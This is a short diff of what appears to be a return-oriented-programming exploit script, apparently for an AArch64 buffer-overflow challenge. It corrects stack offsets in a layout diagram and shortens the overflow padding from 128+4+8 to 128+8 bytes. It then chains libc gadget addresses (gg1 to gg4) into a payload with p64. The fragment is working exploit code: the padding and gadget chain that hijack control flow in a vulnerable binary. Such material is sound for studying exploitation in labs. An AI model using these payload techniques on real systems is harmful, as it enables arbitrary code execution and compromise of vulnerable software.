@@ -27,9 +27,9 @@ x19         ----
 gg1_sp      ----
             0x8: gg1
 x30         ----
-            0x8c
+            0x88
 buffer      ----
-            0x2c
+            0x30
 vul_sp      ----
 
 '''
@@ -45,7 +45,7 @@ gg2 = libc_addr + 0x0004ea34
 gg3 = libc_addr + 0x00053078
 gg4 = libc_addr + 0x0001c480
 
-payload = 'a' * (128 + 4 + 8)
+payload = 'a' * (128 + 8)
 payload += p64(gg1)
 payload += 'a' * 0x18
 payload += p64(gg3)
